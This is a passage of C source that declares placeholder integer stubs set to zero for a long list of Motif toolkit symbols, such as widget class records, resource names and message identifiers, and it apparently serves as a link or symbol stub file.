_XmMsgScrollBar_0003 = 0;\nint _XmMsgScrollBar_0004 = 0;\nint _XmMsgScrollBar_0005 = 0;\nint _XmMsgScrollBar_0006 = 0;\nint _XmMsgScrollBar_0007 = 0;\nint _XmMsgScrollBar_0008 = 0;\nint _XmMsgScrolledW_0004 = 0;\nint _XmMsgScrolledW_0005 = 0;\nint _XmMsgScrolledW_0006 = 0;\nint _XmMsgScrolledW_0007 = 0;\nint _XmMsgScrolledW_0008 = 0;\nint _XmMsgScrolledW_0009 = 0;\nint _XmMsgScrollFrameT_0000 = 0;\nint _XmMsgScrollFrameT_0001 = 0;\nint _XmMsgScrollVis_0000 = 0;\nint _XmMsgSelectioB_0001 = 0;\nint _XmMsgSelectioB_0002 = 0;\nint _XmMsgSpinB_0003 = 0;\nint _XmMsgSpinB_0004 = 0;\nint _XmMsgSpinB_0005 = 0;\nint _XmMsgSpinB_0006 = 0;\nint _XmMsgSpinB_0007 = 0;\nint _XmMsgSpinB_0008 = 0;\nint _XmMsgSSpinB_0001 = 0;\nint _XmMsgSSpinB_0002 = 0;\nint _XmMsgSSpinB_0003 = 0;\nint _XmMsgText_0000 = 0;\nint _XmMsgTextF_0000 = 0;\nint _XmMsgTextF_0001 = 0;\nint _XmMsgTextF_0002 = 0;\nint _XmMsgTextF_0003 = 0;\nint _XmMsgTextF_0004 = 0;\nint _XmMsgTextF_0006 = 0;\nint _XmMsgTextFWcs_0000 = 0;\nint _XmMsgTextIn_0000 = 0;\nint _XmMsgTextOut_0000 = 0;\nint _XmMsgTransfer_0000 = 0;\nint _XmMsgTransfer_0002 = 0;\nint _XmMsgTransfer_0003 = 0;\nint _XmMsgTransfer_0004 = 0;\nint _XmMsgTransfer_0005 = 0;\nint _XmMsgTransfer_0006 = 0;\nint _XmMsgTransfer_0007 = 0;\nint _XmMsgVaSimple_0000 = 0;\nint _XmMsgVaSimple_0001 = 0;\nint _XmMsgVaSimple_0002 = 0;\nint _XmMsgVendor_0000 = 0;\nint _XmMsgVendor_0001 = 0;\nint _XmMsgVendor_0002 = 0;\nint _XmMsgVendor_0003 = 0;\nint _XmMsgVisual_0000 = 0;\nint _XmMsgVisual_0001 = 0;\nint _XmMsgVisual_0002 = 0;\nint _XmMsgXmIm_0000 = 0;\nint _XmMsgXmRenderT_0000 = 0;\nint _XmMsgXmRenderT_0001 = 0;\nint _XmMsgXmRenderT_0002 = 0;\nint _XmMsgXmRenderT_0003 = 0;\nint _XmMsgXmRenderT_0004 = 0;\nint _XmMsgXmRenderT_0005 = 0;\nint _XmMsgXmString_0000 = 0;\nint _XmMsgXmTabList_0000 = 0;\nint xmMultiListClassRec = 0;\nint XmMultiListDeselectItems = 0;\nint XmMultiListDeselectRow = 0;\nint XmMultiListGetSelectedRowArray = 0;\nint XmMultiListGetSelectedRows = 0;\nint XmMultiListMakeRowVisible = 0;\nint XmMultiListSelectAllItems = 0;\nint XmMultiListSelectItems = 0;\nint XmMultiListSelectRow = 0;\nint XmMultiListToggleRow = 0;\nint XmMultiListUnselectAllItems = 0;\nint XmMultiListUnselectItem = 0;\nint xmMultiListWidgetClass = 0;\nint _XmNavigate = 0;\nint _XmNavigChangeManaged = 0;\nint _XmNavigDestroy = 0;\nint _XmNavigInitialize = 0;\nint _XmNavigResize = 0;\nint _XmNavigSetValues = 0;\nint _XmNewTravGraph = 0;\nint _XmNoneCursorIconQuark = 0;\nint xmNotebookClassRec = 0;\nint XmNotebookGetPageInfo = 0;\nint _XmNotebook_manager_translations = 0;\nint _XmNotebook_TabAccelerators = 0;\nint xmNotebookWidgetClass = 0;\nint _XmNotifyChildrenVisual = 0;\nint _XmNumDSResources = 0;\nint XmObjectAtPoint = 0;\nint _XmOffsetArrow = 0;\nint XmOptionButtonGadget = 0;\nint XmOptionLabelGadget = 0;\nint _XmOSAbsolutePathName = 0;\nint _XmOSBuildFileList = 0;\nint _XmOSBuildFileName = 0;\nint _XmOSFileCompare = 0;\nint _XmOSFindPathParts = 0;\nint _XmOSFindPatternPart = 0;\nint _XmOSGenerateMaskName = 0;\nint _XmOSGetCharDirection = 0;\nint _XmOSGetDirEntries = 0;\nint _XmOSGetHomeDirName = 0;\nint _XmOSGetInitialCharsDirection = 0;\nint _XmOSGetLocalizedString = 0;\nint XmOSGetMethod = 0;\nint _XmOSInitPath = 0;\nint _XmOSKeySymToCharacter = 0;\nint _XmOSPutenv = 0;\nint _XmOSQualifyFileSpec = 0;\nint xmOutlineClassRec = 0;\nint xmOutlineWidgetClass = 0;\nint XMoveResizeWindow = 0;\nint XMoveWindow = 0;\nint xmPanedClassRec = 0;\nint XmPanedGetPanes = 0;\nint xmPanedWidgetClass = 0;\nint xmPanedWindowClassRec = 0;\nint xmPanedWindowWidgetClass = 0;\nint _XmParentProcess = 0;\nint XmParseMappingCreate = 0;\nint XmParseMappingFree = 0;\nint XmParseMappingGetValues = 0;\nint XmParseMappingSetValues = 0;\nint XmParsePicture = 0;\nint XmParseTableFree = 0;\nint _XmPathIsTraversable = 0;\nint XmPictureDelete = 0;\nint XmPictureDeleteState = 0;\nint XmPictureDoAutoFill = 0;\nint XmPictureGetCurrentString = 0;\nint XmPictureProcessCharacter = 0;\nint _XmPngGetImage = 0;\nint _XmPopdown = 0;\nint _XmPopup = 0;\nint _XmPopupSpringLoaded = 0;\nint _XmPopWidgetExtData = 0;\nint _XmPostPopupMenu = 0;\nint _XmPrimbaseClassExtRec = 0;\nint _XmPrimClassExtRec = 0;\nint xmPrimitiveClassRec = 0;\nint _XmPrimitive_defaultTranslations = 0;\nint _XmPrimitiveEnter = 0;\nint _XmPrimitiveFocusIn = 0;\nint _XmPrimitiveFocusInInternal = 0;\nint _XmPrimitiveFocusOut = 0;\nint _XmPrimitiveGetValuesHook = 0;\nint _XmPrimitiveHelp = 0;\nint _XmPrimitiveHighlightPixmapDefault = 0;\nint _XmPrimitiveImportArgs = 0;\nint _XmPrimitiveLeave = 0;\nint _XmPrimitiveParentActivate = 0;\nint _XmPrimitiveParentCancel = 0;\nint _XmPrimitiveTopShadowPixmapDefault = 0;\nint _XmPrimitiveUnmap = 0;\nint xmPrimitiveWidgetClass = 0;\nint _XmProcessDrag = 0;\nint _XmProcessTraversal = 0;\nint XmProcessTraversal = 0;\nint xmProtocolClassRec = 0;\nint xmProtocolObjectClass = 0;\nint _XmPushB_defaultTranslations = 0;\nint _XmPushBGadClassExtRec = 0;\nint _XmPushB_menuTranslations = 0;\nint _XmPushBPrimClassExtRec = 0;\nint xmPushButtonClassRec = 0;\nint xmPushButtonGadgetClass = 0;\nint xmPushButtonGadgetClassRec = 0;\nint xmPushButtonGCacheObjClassRec = 0;\nint xmPushButtonWidgetClass = 0;\nint _XmPushWidgetExtData = 0;\nint _XmPutScaledImage = 0;\nint XmQmotif = 0;\nint XmQTaccessColors = 0;\nint XmQTaccessTextual = 0;\nint XmQTactivatable = 0;\nint XmQTcareParentVisual = 0;\nint _XmQTclipWindow = 0;\nint XmQTcontainer = 0;\nint XmQTcontainerItem = 0;\nint XmQTdialogShellSavvy = 0;\nint XmQTjoinSide = 0;\nint XmQTmenuSavvy = 0;\nint XmQTmenuSystem = 0;\nint XmQTmotifTrait = 0;\nint XmQTnavigator = 0;\nint XmQTpointIn = 0;\nint XmQTscrollFrame = 0;\nint XmQTspecifyLayoutDirection = 0;\nint XmQTspecifyRenderTable = 0;\nint XmQTspecifyUnhighlight = 0;\nint XmQTspecifyUnitType = 0;\nint XmQTtakesDefault = 0;\nint XmQTtoolTip = 0;\nint XmQTtoolTipConfig = 0;\nint XmQTtransfer = 0;\nint XmQTtraversalControl = 0;\nint _XmQualifyLabelLocalCache = 0;\nint _XmQueryPixmapCache = 0;\nint _XmQueueCount = 0;\nint _XmQueueFree = 0;\nint _XmQueueInit = 0;\nint _XmQueuePop = 0;\nint _XmRCAdaptToSize = 0;\nint _XmRC_AddPopupEventHandlers = 0;\nint _XmRC_AddToPostFromList = 0;\nint _XmRCArmAndActivate = 0;\nint _XmRC_CheckAndSetOptionCascade = 0;\nint _XmRCColorHook = 0;\nint _XmRCDoMarginAdjustment = 0;\nint _XmRC_DoProcessMenuTree = 0;\nint _XmRC_GadgetTraverseDown = 0;\nint _XmRC_GadgetTraverseLeft = 0;\nint _XmRC_GadgetTraverseRight = 0;\nint _XmRC_GadgetTraverseUp = 0;\nint _XmRCGetKidGeo = 0;\nint _XmRC_GetLabelString = 0;\nint _XmRC_GetMenuAccelerator = 0;\nint _XmRC_GetMnemonicCharSet = 0;\nint _XmRCGetTopManager = 0;\nint _XmRC_KeyboardInputHandler = 0;\nint _XmRCMenuProcedureEntry = 0;\nint _XmRC_menuSystemRecord = 0;\nint _XmRC_PostTimeOut = 0;\nint _XmRCPreferredSize = 0;\nint _XmRC_ProcessSingleWidget = 0;\nint _XmRC_RemoveFromPostFromList = 0;\nint _XmRC_RemoveFromPostFromListOnDestroyCB = 0;\nint _XmRC_RemoveHandlersFromPostFromWidget = 0;\nint _XmRC_RemovePopupEventHandlers = 0;\nint _XmRCSetKidGeo = 0;\nint _XmRC_SetMenuHistory = 0;\nint _XmRC_SetOptionMenuHistory = 0;\nint _XmRC_SetOrGetTextMargins = 0;\nint _XmRCThinkAboutSize = 0;\nint _XmRC_UpdateOptionMenuCBG = 0;\nint _XmReadDragBuffer = 0;\nint _XmReadDSFromStream = 0;\nint _XmReadImageAndHotSpotFromFile = 0;\nint _XmReadInitiatorInfo = 0;\nint _XmReasonToMessageType = 0;\nint _XmReCacheLabG = 0;\nint _XmReCacheLabG_r = 0;\nint _XmRecordEvent = 0;\nint _XmRedisplayGadgets = 0;\nint _XmRedisplayHBar = 0;\nint _XmRedisplayLabG = 0;\nint _XmRedisplayVBar = 0;\nint _XmRegionClear = 0;\nint _XmRegionComputeExtents = 0;\nint _XmRegionCreate = 0;\nint _XmRegionCreateSize = 0;\nint _XmRegionDestroy = 0;\nint _XmRegionDrawShadow = 0;\nint _XmRegionEqual = 0;\nint _XmRegionFromImage = 0;\nint _XmRegionGetExtents = 0;\nint _XmRegionGetNumRectangles = 0;\nint _XmRegionGetRectangles = 0;\nint _XmRegionIntersect = 0;\nint _XmRegionIntersectRectWithRegion = 0;\nint _XmRegionIsEmpty = 0;\nint _XmRegionOffset = 0;\nint _XmRegionPointInRegion = 0;\nint _XmRegionSetGCRegion = 0;\nint _XmRegionShrink = 0;\nint _XmRegionSubtract = 0;\nint _XmRegionUnion = 0;\nint _XmRegionUnionRectWithRegion = 0;\nint _XmRegisterConverters = 0;\nint XmRegisterConverters = 0;\nint _XmRegisterPixmapConverters = 0;\nint XmRegisterSegmentEncoding = 0;\nint _XmRemoveAllCallbacks = 0;\nint _XmRemoveCallback = 0;\nint XmRemoveFromPostFromList = 0;\nint _XmRemoveGrab = 0;\nint _XmRemoveHashEntry = 0;\nint _XmRemoveHashIterator = 0;\nint XmRemoveProtocolCallback = 0;\nint XmRemoveProtocols = 0;\nint XmRemoveTabGroup = 0;\nint _Xm_RemQueue = 0;\nint _XmRenderCacheGet = 0;\nint _XmRenderCacheSet = 0;\nint XmRenderTableAddRenditions = 0;\nint XmRenderTableCopy = 0;\nint XmRenderTableCvtFromProp = 0;\nint XmRenderTableCvtToProp = 0;\nint _XmRenderTableDisplay = 0;\nint _XmRenderTableFindFallback = 0;\nint _XmRenderTableFindFirstFont = 0;\nint _XmRenderTableFindRendition = 0;\nint XmRenderTableFree = 0;\nint XmRenderTableGetDefaultFontExtents = 0;\nint XmRenderTableGetRendition = 0;\nint XmRenderTableGetRenditions = 0;\nint XmRenderTableGetTags = 0;\nint _XmRenderTableRemoveRenditions = 0;\nint XmRenderTableRemoveRenditions = 0;\nint _XmRenditionCopy = 0;\nint _XmRenditionCreate = 0;\nint XmRenditionCreate = 0;\nint XmRenditionFree = 0;\nint _XmRenditionMerge = 0;\nint XmRenditionRetrieve = 0;\nint XmRenditionUpdate = 0;\nint _XmReOrderResourceList = 0;\nint XmRepTypeAddReverse = 0;\nint XmRepTypeGetId = 0;\nint XmRepTypeGetNameList = 0;\nint XmRepTypeGetRecord = 0;\nint XmRepTypeGetRegistered = 0;\nint _XmRepTypeInstallConverters = 0;\nint XmRepTypeInstallTearOffModelConverter = 0;\nint XmRepTypeRegister = 0;\nint XmRepTypeValidValue = 0;\nint _XmRequestNewSize = 0;\nint _XmResetTravGraph = 0;\nint _XmResizeHashTable = 0;\nint _XmResizeObject = 0;\nint _XmResizeWidget = 0;\nint XmResolveAllPartOffsets = 0;\nint XmResolveAllPartOffsets64 = 0;\nint XmResolvePartOffsets = 0;\nint _XmRestoreCoreClassTranslations = 0;\nint _XmRestoreExcludedTearOffToToplevelShell = 0;\nint _XmRestoreTearOffToMenuShell = 0;\nint _XmRestoreTearOffToToplevelShell = 0;\nint _XmRootGeometryManager = 0;\nint _XmRowColumn_bar_table = 0;\nint xmRowColumnClassRec = 0;\nint _XmRowColumn_menu_table = 0;\nint _XmRowColumn_menu_traversal_table = 0;\nint _XmRowColumn_option_table = 0;\nint xmRowColumnWidgetClass = 0;\nint _XmSaccelerator = 0;\nint _XmSacceleratorText = 0;\nint _XmSactivateCallback = 0;\nint _XmSadjustLast = 0;\nint _XmSadjustMargin = 0;\nint _XmSalignment = 0;\nint _XmSallowOverlap = 0;\nint _XmSallowResize = 0;\nint _XmSanimationMask = 0;\nint _XmSanimationPixmap = 0;\nint _XmSanimationPixmapDepth = 0;\nint _XmSanimationStyle = 0;\nint _XmSapplyCallback = 0;\nint _XmSapplyLabelString = 0;\nint _XmSarmCallback = 0;\nint _XmSarmColor = 0;\nint _XmSarmPixmap = 0;\nint _XmSarrowDirection = 0;\nint xmSashClassRec = 0;\nint _XmSash_defTranslations = 0;\nint xmSashWidgetClass = 0;\nint _XmSattachment = 0;\nint _XmSaudibleWarning = 0;\nint _XmSautomaticSelection = 0;\nint _XmSautoShowCursorPosition = 0;\nint _XmSautoUnmanage = 0;\nint _XmSavailability = 0;\nint _XmSaveCoreClassTranslations = 0;\nint _XmSaveMenuProcContext = 0;\nint _XmSblendModel = 0;\nint _XmSblinkRate = 0;\nint _XmSbottomAttachment = 0;\nint _XmSbottomOffset = 0;\nint _XmSbottomPosition = 0;\nint _XmSbottomShadowColor = 0;\nint _XmSbottomShadowPixmap = 0;\nint _XmSbottomWidget = 0;\nint _XmSbrowseSelectionCallback = 0;\nint _XmSbuttonAccelerators = 0;\nint _XmSbuttonAcceleratorText = 0;\nint _XmSbuttonCount = 0;\nint _XmSbuttonFontList = 0;\nint _XmSbuttonMnemonicCharSets = 0;\nint _XmSbuttonMnemonics = 0;\nint _XmSbuttons = 0;\nint _XmSbuttonSet = 0;\nint _XmSbuttonType = 0;\nint _XmSCAccelerator = 0;\nint _XmSCAcceleratorText = 0;\nint _XmSCAdjustLast = 0;\nint _XmSCAdjustMargin = 0;\nint xmScaleClassRec = 0;\nint _XmScaleGetTitleString = 0;\nint XmScaleGetValue = 0;\nint XmScaleSetTicks = 0;\nint XmScaleSetValue = 0;\nint xmScaleWidgetClass = 0;\nint _XmSCAlignment = 0;\nint _XmSCAllowOverlap = 0;\nint _XmScancelButton = 0;\nint _XmScancelCallback = 0;\nint _XmScancelLabelString = 0;\nint _XmSCAnimationMask = 0;\nint _XmSCAnimationPixmap = 0;\nint _XmSCAnimationPixmapDepth = 0;\nint _XmSCAnimationStyle = 0;\nint _XmScanningCacheGet = 0;\nint _XmScanningCacheSet = 0;\nint _XmSCApplyLabelString = 0;\nint _XmSCArmCallback = 0;\nint _XmSCArmColor = 0;\nint _XmSCArmPixmap = 0;\nint _XmSCArrowDirection = 0;\nint _XmScascadeButton = 0;\nint _XmScascadePixmap = 0;\nint _XmScascadingCallback = 0;\nint _XmSCAtomList = 0;\nint _XmSCAttachment = 0;\nint _XmSCAudibleWarning = 0;\nint _XmSCAutomaticSelection = 0;\nint _XmSCAutoShowCursorPosition = 0;\nint _XmSCAutoUnmanage = 0;\nint _XmSCAvailability = 0;\nint _XmSCBackgroundPixmap = 0;\nint _XmSCBlendModel = 0;\nint _XmSCBlinkRate = 0;\nint _XmSCBooleanDimension = 0;\nint _XmSCBottomShadowColor = 0;\nint _XmSCBottomShadowPixmap = 0;\nint _XmSCButtonAccelerators = 0;\nint _XmSCButtonAcceleratorText = 0;\nint _XmSCButtonCount = 0;\nint _XmSCButtonFontList = 0;\nint _XmSCButtonMnemonicCharSets = 0;\nint _XmSCButtonMnemonics = 0;\nint _XmSCButtons = 0;\nint _XmSCButtonSet = 0;\nint _XmSCButtonType = 0;\nint _XmSCCallbackProc = 0;\nint _XmSCCancelLabelString = 0;\nint _XmSCChar = 0;\nint _XmSCCharSetTable = 0;\nint _XmSCChildHorizontalAlignment = 0;\nint _XmSCChildHorizontalSpacing = 0;\nint _XmSCChildPlacement = 0;\nint _XmSCChildren = 0;\nint _XmSCChildType = 0;\nint _XmSCChildVerticalAlignment = 0;\nint _XmSCClientData = 0;\nint _XmSCClipWindow = 0;\nint _XmSCColumns = 0;\nint _XmSCCommandWindow = 0;\nint _XmSCCommandWindowLocation = 0;\nint _XmSCCompoundText = 0;\nint _XmSCConvertProc = 0;\nint _XmSCCursorBackground = 0;\nint _XmSCCursorForeground = 0;\nint _XmSCCursorPosition = 0;\nint _XmSCCursorPositionVisible = 0;\nint _XmSCDarkThreshold = 0;\nint _XmSCDecimalPoints = 0;\nint _XmSCDefaultButtonShadowThickness = 0;\nint _XmSCDefaultButtonType = 0;\nint _XmSCDefaultCopyCursorIcon = 0;\nint _XmSCDefaultFontList = 0;\nint _XmSCDefaultInvalidCursorIcon = 0;\nint _XmSCDefaultLinkCursorIcon = 0;\nint _XmSCDefaultMoveCursorIcon = 0;\nint _XmSCDefaultNoneCursorIcon = 0;\nint _XmSCDefaultPosition = 0;\nint _XmSCDefaultSourceCursorIcon = 0;\nint _XmSCDefaultValidCursorIcon = 0;\nint _XmSCDeleteResponse = 0;\nint _XmSCDesktopParent = 0;\nint _XmSCDialogStyle = 0;\nint _XmSCDialogTitle = 0;\nint _XmSCDialogType = 0;\nint _XmSCDirectory = 0;\nint _XmSCDirectoryValid = 0;\nint _XmSCDirListItemCount = 0;\nint _XmSCDirListItems = 0;\nint _XmSCDirListLabelString = 0;\nint _XmSCDirMask = 0;\nint _XmSCDirSearchProc = 0;\nint _XmSCDirSpec = 0;\nint _XmSCDisarmCallback = 0;\nint _XmSCDoubleClickInterval = 0;\nint _XmSCDragContextClass = 0;\nint _XmSCDragDropFinishCallback = 0;\nint _XmSCDragIconClass = 0;\nint _XmSCDragInitiatorProtocolStyle = 0;\nint _XmSCDragMotionCallback = 0;\nint _XmSCDragOperations = 0;\nint _XmSCDragOverMode = 0;\nint _XmSCDragProc = 0;\nint _XmSCDragReceiverProtocolStyle = 0;\nint _XmSCDropProc = 0;\nint _XmSCDropRectangles = 0;\nint _XmSCDropSiteActivity = 0;\nint _XmSCDropSiteEnterCallback = 0;\nint _XmSCDropSiteLeaveCallback = 0;\nint _XmSCDropSiteManagerClass = 0;\nint _XmSCDropSiteOperations = 0;\nint _XmSCDropSiteType = 0;\nint _XmSCDropStartCallback = 0;\nint _XmSCDropTransferClass = 0;\nint _XmSCDropTransfers = 0;\nint _XmSCEditable = 0;\nint _XmSCEntryBorder = 0;\nint _XmSCEntryClass = 0;\nint _XmSCExportTargets = 0;\nint _XmSCExposeCallback = 0;\nint _XmSCExtensionType = 0;\nint _XmSCFileListItemCount = 0;\nint _XmSCFileListItems = 0;\nint _XmSCFileListLabelString = 0;\nint _XmSCFileSearchProc = 0;\nint _XmSCFileTypeMask = 0;\nint _XmSCFillOnArm = 0;\nint _XmSCFillOnSelect = 0;\nint _XmSCFilterLabelString = 0;\nint _XmSCFontList = 0;\nint _XmSCFONTLIST_DEFAULT_TAG_STRING = 0;\nint _XmSCForegroundThreshold = 0;\nint _XmSCGadgetPixmap = 0;\nint _XmScheckButton = 0;\nint _XmSCHelpLabelString = 0;\nint _XmSCHighlightColor = 0;\nint _XmSCHighlightOnEnter = 0;\nint _XmSCHighlightPixmap = 0;\nint _XmSCHighlightThickness = 0;\nint _XmSchildHorizontalAlignment = 0;\nint _XmSchildHorizontalSpacing = 0;\nint _XmSchildPlacement = 0;\nint _XmSchildPosition = 0;\nint _XmSchildType = 0;\nint _XmSchildVerticalAlignment = 0;\nint _XmSCHorizontalDimension = 0;\nint _XmSCHorizontalFontUnit = 0;\nint _XmSCHorizontalInt = 0;\nint _XmSCHorizontalPosition = 0;\nint _XmSCHorizontalScrollBar = 0;\nint _XmSCHot = 0;\nint _XmSCICCHandle = 0;\nint _XmSCIconAttachment = 0;\nint _XmSCImportTargets = 0;\nint _XmSCIncrement = 0;\nint _XmSCIncremental = 0;\nint _XmSCIndicatorOn = 0;\nint _XmSCIndicatorSize = 0;\nint _XmSCIndicatorType = 0;\nint _XmSCInitialDelay = 0;\nint _XmSCInitialFocus = 0;\nint _XmSCInputCreate = 0;\nint _XmSCInputMethod = 0;\nint _XmSCInvalidCursorForeground = 0;\nint _XmSCIsAligned = 0;\nint _XmSCIsHomogeneous = 0;\nint _XmSCISO8859_DASH_1 = 0;\nint _XmSCItemCount = 0;\nint _XmSCItems = 0;\nint _XmSCKeyboardFocusPolicy = 0;\nint _XmSCKeySym = 0;\nint _XmSCKeySymTable = 0;\nint _XmSCLabelFontList = 0;\nint _XmSCLabelInsensitivePixmap = 0;\nint _XmSCLabelPixmap = 0;\nint _XmSCLabelString = 0;\nint _XmSCLabelType = 0;\nint _XmSclientData = 0;\nint _XmSCLightThreshold = 0;\nint _XmSclipWindow = 0;\nint _XmSCListLabelString = 0;\nint _XmSCListMarginHeight = 0;\nint _XmSCListMarginWidth = 0;\nint _XmSCListSizePolicy = 0;\nint _XmSCListSpacing = 0;\nint _XmSCListUpdated = 0;\nint _XmSCLogicalParent = 0;\nint _XmSCMainWindowMarginHeight = 0;\nint _XmSCMainWindowMarginWidth = 0;\nint _XmSCManBottomShadowPixmap = 0;\nint _XmSCManForegroundPixmap = 0;\nint _XmSCManHighlightPixmap = 0;\nint _XmSCManTopShadowPixmap = 0;\nint _XmSCMappingDelay = 0;\nint _XmSCMarginBottom = 0;\nint _XmSCMarginHeight = 0;\nint _XmSCMarginLeft = 0;\nint _XmSCMarginRight = 0;\nint _XmSCMarginTop = 0;\nint _XmSCMarginWidth = 0;\nint _XmSCMask = 0;\nint _XmSCMaximum = 0;\nint _XmSCMaxItems = 0;\nint _XmSCMaxLength = 0;\nint _XmSCMaxValue = 0;\nint _XmSCMenuBar = 0;\nint _XmSCMenuPost = 0;\nint _XmSCMenuWidget = 0;\nint _XmSCMessageProc = 0;\nint _XmSCMessageWindow = 0;\nint _XmSCMinimizeButtons = 0;\nint _XmSCMinimum = 0;\nint _XmSCMnemonic = 0;\nint _XmSCMnemonicCharSet = 0;\nint _XmSCMoveOpaque = 0;\nint _XmSCMultiClick = 0;\nint _XmSCMustMatch = 0;\nint _XmSCMwmDecorations = 0;\nint _XmSCMwmFunctions = 0;\nint _XmSCMwmInputMode = 0;\nint _XmSCMwmMenu = 0;\nint _XmSCMwmMessages = 0;\nint _XmSCNavigationType = 0;\nint _XmSCNeedsMotion = 0;\nint _XmSCNoMatchString = 0;\nint _XmSCNoneCursorForeground = 0;\nint _XmSCNoResize = 0;\nint _XmSCNotifyProc = 0;\nint _XmSCNumChildren = 0;\nint _XmSCNumColumns = 0;\nint _XmSCNumDropRectangles = 0;\nint _XmSCNumDropTransfers = 0;\nint _XmSCNumExportTargets = 0;\nint _XmSCNumImportTargets = 0;\nint _XmSCOffset = 0;\nint _XmSCOkLabelString = 0;\nint _XmScolumns = 0;\nint _XmScommand = 0;\nint _XmScommandChangedCallback = 0;\nint _XmScommandEnteredCallback = 0;\nint _XmScommandWindow = 0;\nint _XmScommandWindowLocation = 0;\nint _XmSconvertProc = 0;\nint _XmSCOperationChangedCallback = 0;\nint _XmSCOperationCursorIcon = 0;\nint _XmSCOptionLabel = 0;\nint _XmSCOptionMnemonic = 0;\nint _XmSCOutputCreate = 0;\nint _XmSCPacking = 0;\nint _XmSCPageIncrement = 0;\nint _XmSCPaneMaximum = 0;\nint _XmSCPaneMinimum = 0;\nint _XmSCPattern = 0;\nint _XmSCPendingDelete = 0;\nint _XmSCPopupEnabled = 0;\nint _XmSCPositionIndex = 0;\nint _XmSCPostFromButton = 0;\nint _XmSCPostFromCount = 0;\nint _XmSCPostFromList = 0;\nint _XmSCPreeditType = 0;\nint _XmSCPrimForegroundPixmap = 0;\nint _XmSCProc = 0;\nint _XmSCProcessingDirection = 0;\nint _XmSCPromptString = 0;\nint _XmSCProtocolCallback = 0;\nint _XmSCPushButtonEnabled = 0;\nint _XmSCQualifySearchDataProc = 0;\nint _XmSCRadioAlwaysOne = 0;\nint _XmSCRadioBehavior = 0;\nint _XmSCRecomputeSize = 0;\nint _XmSCRectangleList = 0;\nint _XmSCRectangles = 0;\nint xmScreenClass = 0;\nint xmScreenClassRec = 0;\nint _XmScreenGetOperationIcon = 0;\nint _XmScreenGetSourceIcon = 0;\nint _XmScreenGetStateIcon = 0;\nint xmScreenObjectClass = 0;\nint _XmScreenRemoveFromCursorCache = 0;\nint _XmSCRepeatDelay = 0;\nint _XmSCResizeCallback = 0;\nint _XmSCResizeHeight = 0;\nint _XmSCResizePolicy = 0;\nint _XmSCResizeWidth = 0;\nint xmScrollBarClassRec = 0;\nint _XmScrollBar_defaultTranslations = 0;\nint XmScrollBarGetValues = 0;\nint XmScrollBarSetValues = 0;\nint xmScrollBarWidgetClass = 0;\nint xmScrolledWindowClassRec = 0;\nint XmScrolledWindowSetAreas = 0;\nint xmScrolledWindowWidgetClass = 0;\nint _XmScrolledW_ScrolledWindowXlations = 0;\nint XmScrollVisible = 0;\nint _XmSCRowColumnType = 0;\nint _XmSCRows = 0;\nint _XmSCRubberPositioning = 0;\nint _XmSCSashHeight = 0;\nint _XmSCSashIndent = 0;\nint _XmSCSashWidth = 0;\nint _XmSCScaleHeight = 0;\nint _XmSCScaleMultiple = 0;\nint _XmSCScaleWidth = 0;\nint _XmSCScroll = 0;\nint _XmSCScrollBarDisplayPolicy = 0;\nint _XmSCScrollBarPlacement = 0;\nint _XmSCScrolledWindowMarginHeight = 0;\nint _XmSCScrolledWindowMarginWidth = 0;\nint _XmSCScrollingPolicy = 0;\nint _XmSCScrollSide = 0;\nint _XmSCSelectColor = 0;\nint _XmSCSelectedItemCount = 0;\nint _XmSCSelectedItems = 0;\nint _XmSCSelectInsensitivePixmap = 0;\nint _XmSCSelectionArrayCount = 0;\nint _XmSCSelectionLabelString = 0;\nint _XmSCSelectionPolicy = 0;\nint _XmSCSelectionType = 0;\nint _XmSCSelectPixmap = 0;\nint _XmSCSelectThreshold = 0;\nint _XmSCSeparatorOn = 0;\nint _XmSCSeparatorType = 0;\nint _XmSCSet = 0;\nint _XmSCShadowThickness = 0;\nint _XmSCShadowType = 0;\nint _XmSCShellHorizDim = 0;\nint _XmSCShellHorizPos = 0;\nint _XmSCShellUnitType = 0;\nint _XmSCShellVertDim = 0;\nint _XmSCShellVertPos = 0;\nint _XmSCShowArrows = 0;\nint _XmSCShowAsDefault = 0;\nint _XmSCShowSeparator = 0;\nint _XmSCShowValue = 0;\nint _XmSCSimpleCheckBox = 0;\nint _XmSCSimpleMenuBar = 0;\nint _XmSCSimpleOptionMenu = 0;\nint _XmSCSimplePopupMenu = 0;\nint _XmSCSimplePulldownMenu = 0;\nint _XmSCSimpleRadioBox = 0;\nint _XmSCSizePolicy = 0;\nint _XmSCSliderSize = 0;\nint _XmSCSource = 0;\nint _XmSCSourceCursorIcon = 0;\nint _XmSCSourceIsExternal = 0;\nint _XmSCSourcePixmapIcon = 0;\nint _XmSCSourceWidget = 0;\nint _XmSCSourceWindow = 0;\nint _XmSCSpacing = 0;\nint _XmSCStartTime = 0;\nint _XmSCStateCursorIcon = 0;\nint _XmSCStringDirection = 0;\nint _XmSCTearOffModel = 0;\nint _XmSCTextFontList = 0;\nint _XmSCTextString = 0;\nint _XmSCTextValue = 0;\nint _XmSCTitleString = 0;\nint _XmSCTopCharacter = 0;\nint _XmSCTopItemPosition = 0;\nint _XmSCTopLevelEnterCallback = 0;\nint _XmSCTopLevelLeaveCallback = 0;\nint _XmSCTopShadowColor = 0;\nint _XmSCTopShadowPixmap = 0;\nint _XmSCTransferProc = 0;\nint _XmSCTransferStatus = 0;\nint _XmSCTraversalOn = 0;\nint _XmSCTraversalType = 0;\nint _XmSCTreeUpdateProc = 0;\nint _XmSCTroughColor = 0;\nint _XmSCUnitType = 0;\nint _XmSCUnpostBehavior = 0;\nint _XmSCUnselectPixmap = 0;\nint _XmSCUpdateSliderSize = 0;\nint _XmScursorBackground = 0;\nint _XmScursorForeground = 0;\nint _XmScursorPosition = 0;\nint _XmScursorPositionVisible = 0;\nint _XmSCUseAsyncGeometry = 0;\nint _XmSCUserData = 0;\nint _XmSCValidCursorForeground = 0;\nint _XmSCValueChangedCallback = 0;\nint _XmSCValueWcs = 0;\nint _XmSCVerifyBell = 0;\nint _XmSCVerticalAlignment = 0;\nint _XmSCVerticalDimension = 0;\nint _XmSCVerticalFontUnit = 0;\nint _XmSCVerticalInt = 0;\nint _XmSCVerticalPosition = 0;\nint _XmSCVerticalScrollBar = 0;\nint _XmSCVirtualBinding = 0;\nint _XmSCVisibleItemCount = 0;\nint _XmSCVisibleWhenOff = 0;\nint _XmSCVisualPolicy = 0;\nint _XmSCWhichButton = 0;\nint _XmSCWordWrap = 0;\nint _XmSCWorkWindow = 0;\nint _XmSCXmBackgroundPixmap = 0;\nint _XmSCXmFONTLIST_DEFAULT_TAG_STRING = 0;\nint _XmSCXmString = 0;\nint _XmSCXmStringCharSet = 0;\nint 